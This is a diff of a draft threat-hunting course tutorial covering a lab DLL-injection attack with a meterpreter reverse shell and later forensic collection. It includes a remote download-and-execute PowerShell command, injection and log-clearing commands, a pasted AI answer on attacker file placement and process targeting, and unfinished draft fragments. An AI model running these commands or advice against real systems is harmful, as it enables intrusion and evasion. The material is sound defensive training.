@@ -40,11 +40,7 @@ Further, I also believe in the merit of a top-down learning approach - instead o
 
 `This first course is focused on threat hunting standard DLL-injected C2 implants.`
 
-INTRO
-THEORY
-| MEAT |
-REFERENCES
-CHEAT SHEET
+
 
 Here's a quick overview of the entire course: 
 1. **Setting up our Virtual Environment**
@@ -78,28 +74,11 @@ So without any further preamble, ***LET'S GET IT***.
 # 1. Setting up our Virtual Environment
 # Introduction
 
-In this section we'll set up the three VMs we'll need for the course - Windows 10 (Victim), Kali Linux (Attacker), Ubuntu 20.04 (Post-Mortem Analysis). First we'll download the iso files online, and then we'll install the base operating systems. In addition we will configure each VM further: 
-
-1. For the Windows 10 VM (Victim) we will then also
-    - deep disable MS Defender + Windows updates
-    - install sysmon
-    - enable powershell logging
-    - install Process Hacker
-    - install winpmem
-    - install wireshark
-    - install DeepBlueCLI
-
-- turn our VM into a template so we can clone copies in the future
-
-    - 
-
-2. Since the Kali Linux VM (Attacker) contains
-
-3. For the Ubuntu 20.04 (Post-Mortem Analysis) we will then also
-    - ni
-
+In this section we'll set up the three VMs we'll need for the course - Windows 10 (Victim), Kali Linux (Attacker), Ubuntu 20.04 (Post-Mortem Analysis). First we'll download the iso files, then we'll install the operating systems, and finally we'll configure them.
 
 # Requirements
+
+{{< figure src="/img/tripleram.gif" title="" class="custom-figure" >}}
 
 I do want to give you some sense of the hardware requirements for this course, however I also have to add that I am not an expert in this area. ***AT ALL.*** So I'll provide an overview of what we'll be running, as well as what I think this translates to in terms of host resources (ie your actual system). But please - if you disagree with my estimation and believe you can finagle your way to getting the same results by adapting the process, then I salute you for that is the *way of the hacker*. 
 
@@ -113,11 +92,11 @@ So based on this, that is roughly 2x the above + resources for your actual host 
 - 16 GB RAM (32+ even better)
 - 200 GB free HD space
 
-{{< figure src="/img/tripleram.gif" title="" class="custom-figure" >}}
+{{< figure src="/img/beefcake.gif" title="" class="custom-figure" >}}
 
 I understand this is beefy, but consider:
-- You could create an actual physical network, for ex with a Raspberry Pi cluster, and run the VMs on that. Or mini-pcs, or refurbished clients - really for a few hundred dollars you could more than easily be equipped to run a small network. I don't want to sound insensitive to a few 100 dollars, but I'm gonna level with you: if you want to learn cybersecurity then there is no better investment than having localized resources to create virtual simulations. 
-- In case you don't want to invest up-front but don't mind paying some running costs: You can also use a service like Linode and simply rent resources via the cloud. 
+- You don't have to use a single system to run the entire VLAN - you could create an actual physical network, for ex with a Raspberry Pi cluster, and run the VMs on that. Or mini-pcs, or refurbished clients - really for a few hundred dollars you could more than easily be equipped to run a small network. I don't want to sound insensitive to a few 100 dollars, but I'm gonna level with you: if you want to learn cybersecurity then there is no better investment than having localized resources to create virtual simulations. 
+- In case you don't want to invest up-front but don't mind paying some running costs: You can also use a service like [Linode](https://www.linode.com) and simply rent compute via the cloud. In other words you'll rent a system in the cloud and run the VM on that. 
 
 Finally I want to mention that everything we will use is completely free. This course ain't upselling a full course, and every piece of software is freely available. The only exception has free alternatives, and I'm about to discuss that with you right now. 
 
@@ -542,9 +521,20 @@ OK. Do you know what time it is? Yeah it's time for all this installing and conf
 ***
 
 # 2. Performing the Attack 
+# Introduction 
+Why are we performing the attack ourselves? Why didn't I just do it, export all the requisite artifacts, and share this with you? Why did I make you go through this rigmorale - is it simply that I am cruel?
+
+{{< figure src="/img/cruel.gif" title="" class="custom-figure" >}}
+
+Nah. The reason is pretty simple - I have a deep sense of conviction in the idea that you can only truly "get" defense if you equally "get" offense. If I just black box that entire process then once we start hunting everything is abstract - the commands we ran, the files we used, the techniques we employed etc are all just ideas. So when you then learn to threat hunt these things that exists as nothing more than ideas for you, then you'll most be memorizing - if X happens then I do Y.
+
+But, if instead you do the attack first and learn everything involved by doing it yourself, it does not exist as an abstract idea but as a concrete experience. I think then when you perform the threat hunt, because you have a connection to these things you are hunting (since you created them), well then you learn less through memorization and more through understanding. At least this has been my experience as well as that of many, *much* smarter people than myself. 
+
+So let's jump into a bit of theory that will help us understand just what we are getting up to once we get to the actual attack, which will follow immediately afterwards.
+
 # Theory
 # what is a DLL?
-Succinctly as possible, a DLL is a communal library containing code. They are not a program or an executable in and of themselves, but they are in essence a collection of functions and data that can be used by other programs. 
+As succinct as possible, a DLL is a file containing shared code. It's not a program or an executable in and of itself, rather a DLL is in essence a collection of functions and data that can be used by other programs. 
 
 So think of a DLL as a communal resource: let's say you have 4 programs running and they all want to use a common function - let's say for the sake of simplicity the ability to minimize the gui window. Now instead of each of those programs having their own personal copy of the function that allows that, they'll instead access a DLL that contains the function to minimize gui windows instead. So when you click on the minimize icon and that program needs the code to know how to behave, it does not get instructions from its own program code, rather it pulls it from the appropriate DLL with some help from the Windows API. 
 
@@ -553,58 +543,47 @@ Thus any program you run will constantly call on different DLLs to get access to
 # what is a classical DLL-injection?
 So keeping what I just mentioned in mind - that any running program is accessing a variety of code from various DLLs at any time - what then is a DLL-injection attack? Well in a normal environment we have legit programs accessing code from legit DLLs. 
 
-With a DLL-injection attack we enter into the population of legit DLLs a malicious one, that is a DLL that contains the code the attacker wants executed. The attacker then injects it into the memory space of a legitimate process. Using a Windows API function (commonly LoadLibrary or CreateRemoteThread), the attacker manipulates the legitimate process into loading and executing the malicious DLL. This effectively allows the malicious code within the DLL to run, often with the same permissions as the hijacked process.
+With a DLL-injection attack an attacker enters into the population of legitimate DLLs a malicious one, that is a DLL that contains the code the attacker wants executed. Once the malicious DLL is ready, the attacker then basically tricks a legitimate app into loading it into its memory space and then executing it. Thus a DLL injection is a way to get another program to run your code, instead of creating a program specifically to do so. 
 
-Threat actors love DLL-injection attacks because since they are executed within the context of a legitimate process they run with the same privileges as that of the process (ie potentially elevated), but even more so it makes them much harder to detect. No longer can we look on the process-level for malware, instead we have to peer beneath them at a arguably convoluted level of abstraction. 
+Threat actors love injecting DLLs for two main reasons. First, injected code runs with the same privileges and the legitimate process - meaning potentially elevated. Second, doing so makes it, in general, much harder to detect. There's no longer an opportunity to find a "smoking gun" .exe file, rather to find anything malicious we need to peer beneath the processes at an arguably more convoluted level of abstraction. 
 
-Even though classical DLL-injection attacks are less noisy for this exact reason, they still have a design flaw that makes our lives as threat hunters easier - they leave their fingerprints all over the disc. When the malicious DLL is initially transferred to the victim's system, it's written to disc, allowing us a potential breadcrumb for discovery. 
+So that's DLL injection in a nutshell, but what then is *standard* DLL-injection? Well there are a few ways in which to achieve the process I described above, of which standard is one such way. What distinguishes it is that the malicious DLL is first written to the victim's disk before being loaded. This can quite obviously considered a design flaw that makes our lives as threat hunters easier since disk-based fingerprints are not ephemeral. 
 
-And thus the inevitable next iteration in this branch of digital evolution is...
+As a side-note: the thus logical evolutionary improvement on standard DLL-injections are *reflective loading* DLL-injections. Instead of writing the malicious DLL to disk, they inject it directly into memory thereby increasing the volatility of any evidence. But hold that thought until our next course, where we'll be covering it.
 
-# what is a reflective DLL-injection?
-At a *high-level*  classical and reflective DLLs are identical save for one difference: whereas the former is written to disc then injected into memory space, the latter is injected into memory space directly. This makes them conventionally even harder to catch since we can't rely on any disc forensics to reveal its presence. However, as we'll learn in this course, in another way it makes it for those who know what to look for perhaps a bit easier. 
+{{< figure src="/img/hold.gif" title="" class="custom-figure" >}}
 
-How come?
+# What is a Command and Control (C2) Stager, Server, and Payload?
 
-Well, on a pattern-level we can observe that the very fact that a DLL, meaning ANY DLL, is in memory without a disc counterpart is very unusual. Perhaps not immediate incident alert level unusual, but at the very least more than unusual enough to warrant further prodding with piqued interest. 
+Let's start by sketching a scenario of how many typical attacks play out these days. An attacker sends a spear-phishing email to an employee at a company. The employee, perhaps tired and not paying full attention, opens the so-called *"urgent invoice"* attached to the email. 
 
-As a bridge to the closing part of our theory section let's zoom out a bit. Here we have been speaking about a specific mechanism of how malware (that is bad code) gets a victim's system to execute it. There are obviously many other such mechanisms, and equally bviously there are many different types of malware that use specifically DLL-injection attacks as the means to their desired ends (ie getting executed). 
+{{< figure src="/img/drevil.gif" title="" class="custom-figure" >}}
 
-In this specific course however we'll be focussing on a very specific type of malware, actually it would be even more accurate to say we'll focus on a specific component of a specific type of malware... 
+Opening this attachment executes a tiny program called a `stager`. A stager, though not inherently malicious, "sets the stage" by performing a specific task: it reaches out to a designated address, often a web server owned by the hacker, to download + execute another piece of code.
 
-# what is a Command and Control (C2) framework, stager, and beacon?
+This new code properly establishes the attacker's presence on the victim's system. It acts as a "gateway," allowing the attacker to execute commands on the victim's system from their own. And this system, the one they use to execute commands on that of the victim, is what we call the `C2 Server`. 
 
-Let's start by sketching a scenario of how many typical attacks play out these days.
+And finally the code the stager downloaded, allowing the C2 server to establish its control on the victim's system, is called a `payload`, though depending on the exact context as well as framework may be called an `implant` (a more generic term), or a `beacon`. The latter is reserved for the type of implants used by for example Cobalt Strike which do not maintain a continuous, persistent network connection (which can raise suspicion), but instead performs a high latency, asynchronous periodic "check in". 
 
-{{< figure src="/img/hackers01.gif" title="" class="custom-figure" >}}
+# References
 
-An attacker sends a spear-phishing email to an employee at a company. The employee, perhaps tired and not paying full attention, opens the "uregent invoice" attached to the email. Opening this attachment executes a tiny program called a stager.
+So though admittedly the previous sections is a somewhat shallow overview of these complex terms, I do think this does suffice for the purposes of moving ahead with the practical component of our course. However in case you wanted to understand it to a greater depth, here are my top picks for this topic:
 
-A stager, though not inherently malicious, "sets the stage" by performing a specific task: it reaches out to a designated address (owned by the hacker) to download another piece of code, then executes it.
+[Keynote: Cobalt Strike Threat Hunting | Chad Tilbury](https://www.youtube.com/watch?v=borfuQGrB8g)
 
-The downloaded code establishes the attacker's presence on the victim's system. It acts as a "gateway," allowing the attacker to execute commands on the victim's system from their own.
+[In-memory Evasion - Detections | Raphael Mudge](https://www.youtube.com/watch?v=lz2ARbZ_5tE)
 
-So the system that the attacker uses to execute these commands is called the Command and Control (C2) server.
+[Advanced Attack Detection | William Burgess +  Matt Wakins](https://www.youtube.com/watch?v=ihElrBBJQo8)
 
-The code downloaded by the stager is a type of C2 implant known as a beacon, an approach popularized by Cobalt Strike. Unlike traditional C2 implants that maintain a continuous, persistent network connection (which can raise suspicion), a beacon does not. 
 
-Instead, it periodically "calls home" to the C2 server, asking whether there are any new commands. If there are no commands, the connection is immediately terminated. If there are commands, the beacon retrieves them and then terminates the connection, lying dormant until the next scheduled "check-in". This sporadic communication helps the beacon blend into normal network traffic, making it more difficult to detect.
+# ATTACK!
 
-GREAT, and that's it for the theory, it's time to get going! But in case you are feeling inspired here are a selection of incredible resources that helped me.
+Finally! Let's get at it... 
 
-Change these for links and short descriptions
+{{< figure src="/img/attack_kip.gif" title="" class="custom-figure" >}}
 
-{{< youtube borfuQGrB8g >}}
-
-.
-{{< youtube lz2ARbZ_5tE >}}
-
-.
-{{< youtube ihElrBBJQo8 >}}
-
-Preamble:
-1. First things first - fire up both VMs.
-2. On our kali VM - open a terminal and run `ip a` so we can see what the ip address is. Write this down, we'll be using it a few times during the generation of our stager and handler. You can see mine below is **192.168.230.155 **NOTE: Yours will be different!
+1. First things first - fire up both your Windows 10 and Kali VMs.
+2. On our Kali VM - open a terminal and run `ip a` so we can see what the ip address is. Write this down, we'll be using it a few times during the generation of our stager and handler. You can see mine below is **192.168.230.155** NOTE: Yours will be different!
 
 {{< figure src="/img/image032.png" title="" class="custom-figure" >}}
 
@@ -616,11 +595,22 @@ Preamble:
 
 {{< figure src="/img/image034.png" title="" class="custom-figure" >}}
 
-5. Next we'll just create a simple text file on the desktop which will basically emulate the "nuclear codes" the threat actor is after. Right-click on the dekstop, `New` > `Text document`, give it a name and add some generic content. 
+5. Next we'll just create a simple text file on the desktop which will basically emulate the "nuclear codes" the threat actor is after. Right-click on the desktop, `New` > `Text document`, give it a name and add some generic content. 
 
 {{< figure src="/img/image035.png" title="" class="custom-figure" >}}
 
-6. And the final step before we get going is starting a Wireshark pcap recording. In the search bar write `WireShark` and open it. Under `Capture` you will see the available interfaces, in my case the one we want is called `Ethernet0` - yours may or may not have the same name. How do you know which is the correct one? Look at the little graphs next to the names only one should have little spikes representing actual network traffic, the rest are likely all flat. It's the active one, ie the one with traffic, we want - see image below. Once you've identified it, simply double-click on it, this then starts the recording. 
+6. Next we want to start capturing our packet capture using `WireShark`. In the search bar write `WireShark` and open it. Under `Capture` you will see the available interfaces, in my case the one we want is called `Ethernet0` - yours may or may not have the same name. How do you know which is the correct one? Look at the little graphs next to the names, only one should have little spikes representing actual network traffic, the rest are likely all flat. It's the active one, ie the one with traffic, we want - see image below. Once you've identified it, simply double-click on it, this then starts the recording. 
+
+7. And now finally, right before we start our attack I also want to clear both logs we activated - Sysmon and PowerShell ScriptBlock. You see since we've enabled it, it's likely recorded a bunch of events completely irrelevant to our interest here. So we'll clear them and start a new so our final capture is undiluted. Open a PowerShell terminal as admin, and then run the following commands.
+```
+wevtutil cl "Microsoft-Windows-Sysmon/Operational”
+```
+```
+wevtutil cl "Microsoft-Windows-PowerShell/Operational"
+```
+
+
+
 
 NO WE ALSO WANT TO CLEAR BOTH POWERSHELL AND SYSMON LOGS
 - after attack immediatelly export sysmon log, then powershell log, then dump memory, then stop pcap, then we do live reading, then do we stop malware.
@@ -715,13 +705,8 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 
 Note that after you run it there won't be any feedback/output. In case you did not know this is almost universally true: when it comes to PowerShell, not receiving any feedback/output almost always means the command ran succesfully. If there was an error, you'll get some red text telling you what went wrong. 
 
-OK so let's just hold back for a second. At this point, if you have your wits about you, you might be calling shenanigans. 
 
-{{< figure src="/img/shenanigans.gif" title="" class="custom-figure" >}}
 
-"Wait", I hear you say, "if the whole point of infecting the victim and getting C2 control established is so that we can run commands on it, isn't it cheating then to be running these commands ahead of that actually happening? We've now both downloaded the DLL file and run another command to download a script from a webserver and inject it into memory and it's not like the victim is going to do that for us. So what gives?"
-
-Well, here the simple answer - this is a threat hunting course. And so we are "cheating" in a sense with the goal of saving to save the time of crafting an actual spearphishing email, which if done correctly will do both the things we did here manually (ie download DLL and inject remotely-hosted script into memory). If you wanted a more realistic simulation of the Initial Compromise, well there are courses-a-plenty on it (I provide some links below), so please explore your intellecutal curiosites to your heart's complete content. But for now, we're streamling all the peripheral actions so we can focus on the heart of this course - threat hunting. 
 
 Great so the script that will inject `evil.dll` into a process memory space is now in memory. But to be clear: though we've injected that script into memory, but we've not yet executed it. We're about to do so, but before that there's one thing we need. Remeber in the beginning when I explained about how dll-injections work I said that we basically "trick" a legit process into running code from a malicious DLL. So this script is what's going to be doing the trickery, we of course have our malicious DLL which we transferred over, so taht means we only need a legit process.
 
@@ -758,10 +743,173 @@ Additionally, we can also drop into a `shell`.
 
 {{< figure src="/img/image052.png" title="" class="custom-figure" >}}
 
-So that's it for our attack! Let's stop our traffic packet capture:
+That's it for our attack!
+
+# Artifact Collection
+
+One final thing before we move one: lets concretize all our artifacts.
+
+First we'll export our Sysmon log, run the following command in an administrative PowerShell terminal:
+```
+wevtutil epl "Microsoft-Windows-Sysmon/Operational" "C:\Users\User\Desktop\SysmonLog.evtx”
+```
+
+Stay in the same administrative PowerShell terminal so we can also export our PowerShell ScriptBlock logs:
+```
+wevtutil epl "Microsoft-Windows-PowerShell/Operational" "C:\Users\User\Desktop\PowerShellScriptBlockLog.evtx" "/q:*[System[(EventID=4104)]]"
+```
+
+Now let's stop our packet capture: 
 1. Open WireShark.
 2. Press the red STOP button.
 3. Save the file, in my case I will save it to desktop as `dllattack.pcap`.
+
+And finally we'll dump the memory for our post-mortem analysis:
+1. Open a `Command Prompt` as administrator. 
+2. Navigate to the directory where you saved `winpmem`, in my case it's on the desktop.
+3. We'll run the following command, meaning it will dump the memory and save it as `memdump.raw` in our present directory
+
+```
+winpmem.exe memdump.raw
+```
+
+Awesome. We're ready to move on to our analysis, however I wanna take a kinda "detour" chapter next to grant us a bit of perspective. If it sounds a bit befuddling now, please venture forth soon it will make sense. 
+
+{{< figure src="/img/confused_dude.gif" title="" class="custom-figure" >}}
+
+***
+
+# Shenanigans! A (honest) review of our attack
+
+OK so let's just hold back for a second. At this point, if you have your wits about you, you might, and rightfully I'll add, be calling **shenanigans** on me. 
+
+{{< figure src="/img/shenanigans.gif" title="" class="custom-figure" >}}
+
+"Wait", I hear you say, "if the whole point of infecting the victim and getting C2 control established is so that we can run commands on it, isn't it cheating then to be running these commands ahead of that actually happening"? Look at the meta: the whole point of establishing C2 on the victim is so we can run commands on it, but we literally just allowed ourselves to freely run commands on the victim so that we can establish C2. We wrote our malicious DLL to disk, injected our DLL-injection script into memory, and ran the script all from the comfort of Imaginationaland.
+
+{{< figure src="/img/imagination.gif" title="" class="custom-figure" >}}
+
+So then the answer is yes. That was cheating - of course. But, it's cheating with a purpose you see, the purpose here being that this is a course on threat hunting and not on initial compromise. So we stripped the actions of the initial compromise down to its core and for now we've foregone our spearfishing email and VBA macro. We've streamlined the essence of the attack - we're expending less energy in the effort, and yet for our intents have created the same outcome. If you wanted a more realistic approximation of the initial compromise + other elements of Red Teaming - [here's a good free resource to get you going](https://www.youtube.com/watch?v=EIHLXWnK1Dw&list=PLBf0hzazHTGMjSlPmJ73Cydh9vCqxukCu)
+ 
+
+So, we won't be investing our time in completely recraftin an realistic simulation of the intial compromise, HOWEVER, I do think it's very important for us to discuss here what it would look like. We are about to embark on a Threat Hunt, which is an investigation; but there would be no value for us to go attempting to discover things that exists only because of our specific "cheating" method here. Meaning: I want to make sure you understand which parts of the attack we just performed are representative of an actual acttack, and which are not. The reason for this of course is so we can focus on what really matters - ie that which we expect to see following a real-life attack. 
+
+So the remainder of this section will be dedicated to that. I'm very briefly going to review all the main beats to the attack we just performed, thereafter I'll "translate" the actions to their real-world counterpart, pointing out specifically which elements we expect to see in an actual attack, and which we don't. 
+
+Here's what we just did in our attack:
+1. We crafted a malicious DLL on our system.
+2. We transferred this DLL over to the victim's system.
+3. We opened a meterpreter handler on our system.
+4. We then downloaded a powershell script from a web server, and injected it into the victim's memory.
+5. We opened a legitimate program (rufus.exe).
+6. We then 
+
+
+
+
+
+
+
+
+
+ simulation of the Initial Compromise, well there are courses-a-plenty on it 
+ 
+ 
+ (I provide some links below), so please explore your intellecutal curiosites to your heart's complete content. 
+
+But for now, we're 
+
+
+
+
+
+I want to share with you exactly how i performed the dll-injection attack from my kali vm on my windows vm. however, a lot of this is obviously not realistic since I (as the attacker in this scenario) am simply running commands on the victim's system, however at this point theoretically I should not have access to the system, the whole point for performing the attack after all is to get access to it. 
+
+So please do me a favour, describe exactly how what i did would happen in a realistic hypothetical situation? even better, i am going to write my own guess, and then  comment on that and say where i was wrong, right etc.
+
+OK so this is how the actual attack happened
+- i generated a malicious dll on my kali machine using msfvenom and opened a rev tcp handler for a meterpreter shell
+- i created a http server in kali
+- then on the victim's system i downloaded the malicious dll
+- i then ran the following command, which will grab a script from a http server and inject it into memory
+
+IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/faanross/threat.hunting.course.01.resources/main/Invoke-DllInjection-V2.ps1')
+
+- after this i then opened a program, rufus.exe
+- i ran ps to get the pid of rufus
+- i then ran this command which injected the dll into the rufus memory space, this then called back to my handler, giving me a shell. 
+
+Invoke-DllInjection -ProcessID 3468 -Dll C:\Users\User\Desktop\evil.dll
+
+
+OK, so again a lot of that was "cheating", so I am assuming this is how it could potentially happen realistically?
+
+- an attacker might embed a malicious vbscript macro in a word doc, attach it as an "urgent invoice" in a spearfishing email targeted at head of sales
+- let's say they enable macros, the script executes
+- this script then does what?
+- it goes and downloads the malicious dll from a web server the attacker owns
+- where would it typically be saved? what are "best practices" from the attacker's pov in terms of naming and location to minimize chances of getting caught, 
+- is this same script then responsile for running the IEX command to inject the other script into memory?
+- and is this same initial script also responsible for running the final invoke command?
+- Or would the first script download yet another script which will perform the previous two actions? 
+- and then in the simulation i opened a specific app to inject into (rufus), but i am assuming this is unnecessary risk and thus an actual attacker would likely rather prefer to look at existing processes and inject into one of them? how does one learn about them and their PIDs, and how would it typically decide which is best? or are they pre-programmed to always inject into the same app which the attacker knows is 99% open on victim's machine? and if so, which processes are typical targets? 
+
+finally i have to ask why? since the initial vbscript could just as well called back to the handler, bypassing multiple steps (download dll, download script, invoke script) all which could have failed, why do we go through all that effort to get the same result? is it because that would ultimetly represent a stealthier process and thus less chance of getting caught? 
+
+i know there are a lot of questions etc here please be thorough, go through evertything point by point and comment + answer as much as you can!
+
+========================================
+
+ALWAYS about trade-offs
+intiial script does veverything
+- less risk cause file is smaller
+- more risk because more actions being performed
+
++ vice-versa
+
+
+This is a great scenario to walk through! It allows us to get a real sense of how an attack might unfold, step by step. 
+
+**1. Your attack setup:**
+Your attack setup is quite realistic in its basic structure. You've covered the generation of a malicious DLL, setting up a reverse shell listener, creating a web server to host the malicious file, downloading it to the victim's machine, and injecting it into a running process. 
+
+**2. How it might occur in the real world:**
+In the real world, an attacker might indeed use a spear-phishing email with a malicious Word document as you suggested. 
+
+When macros are enabled, a script could indeed execute that downloads the malicious DLL from the attacker's server. 
+
+Where the file is saved on the target system would depend on the attacker's preferences and the permissions of the context in which the script runs. Often, attackers will try to save the file in a location that seems innocuous and is less likely to be scanned by antivirus, such as the user's profile directory, temp directory, or a directory related to a legitimate software program. 
+
+**3. On the DLL and its execution:**
+The initial script could certainly be responsible for running the IEX command that loads the DLL injection script into memory and then calls the DLL injection function with the appropriate parameters. Alternatively, the initial script could download another script to perform these tasks, as you suggested. Both approaches are feasible and have been observed in real attacks.
+
+**4. On process injection:**
+You're correct that an attacker would typically look for a running process into which they can inject the malicious code. Often, they'll look for processes that are likely to be running on the machine and that are less likely to be terminated or restarted. Common targets might include svchost.exe, explorer.exe, or other system processes.
+
+**5. Why go through these steps?**
+The reason to go through these steps rather than just having the initial script call back to the handler is indeed often about stealth. Each of these steps might be detected by a different defensive tool, so by breaking the attack up into these steps, an attacker increases the chances that at least some part of the attack will go undetected. For example, a network intrusion detection system might not detect the initial spear-phishing email, but it might detect the download of the malicious DLL. Similarly, a host-based antivirus might not detect the download of the DLL but could potentially detect the process injection. By using these different techniques, an attacker hopes to evade at least some defenses.
+
+This kind of attack is complex and requires significant sophistication on the part of the attacker. However, it also has a high probability of success if not properly defended against. Proper defense requires a multi-layered approach, including user education, network and host-based intrusion detection, antivirus, and more.
+
+Please note that discussing these details is purely for educational purposes, and attempting to perform such attacks without proper authorizations and permissions is illegal and unethical.
+
+1. transfer DLL
+2. inject PS script into memroy
+3. open app (but likely this will aready be open meaning an attacker will likely simply co-opt something
+4. run command to inject dll from 1 into app in 3
+5. run a remote command. 
+6. exfiltrate data
+7. drop a shell
+8. run a command in shell
+
+
+
+
+
+
+
+
+
 
 
 And while this connection is still going we'll jump right into live memory analysis. Ok so just so we don't end up just learning a bunch of "arbitraty" diagnostic properties to look out for we have to go on a brief side quest to gather some Theory Berries of Enhanced Insight that has the property of helping our party gain greater insight into what we should be looking for, and more importantly - why.
@@ -773,7 +921,14 @@ RIGHT AFTER ATTACK WE DO THE "REVIEW"
 
 NOTE WE ALSO WANT TO INCLUDE THE ANALYSIS WITH STANDARD WINDOWS TOOLS A LA JOHN STRAND STYLE TO SEE WHAT WE CAN LEARN
 
+
+
+
+
+
+
 # SIDE QUEST: The theoretical berries of C2 beacon live reading
+# No this is just the theory section for our Live: Process Hacker section
 
 {{< figure src="/img/quest02.gif" title="" class="custom-figure" >}}
 
@@ -866,14 +1021,7 @@ add a table here
 review results, conclusions we can come to, next steps etc.
 
 **Memory Dump**
-One final thing before we kill the connection and start our post-mortem analysis: we need to dump the memory. 
-1. Open a `Command Prompt` as administrator. 
-2. Navigate to the directory where you saved `winpmem`.
-3. We'll run the following command, meaning it will dump the memory and save it as `memdump.raw` in our present directory
 
-```
-winpmem.exe memdump.raw
-```
 
 Feel free to shut down the Kali VM - this will of course kill the connection but for now that's not an issue since we have everything we need: a memory dump, a traffic packet capture, and logs (WEL, PowerShell, Sysmon). 
 
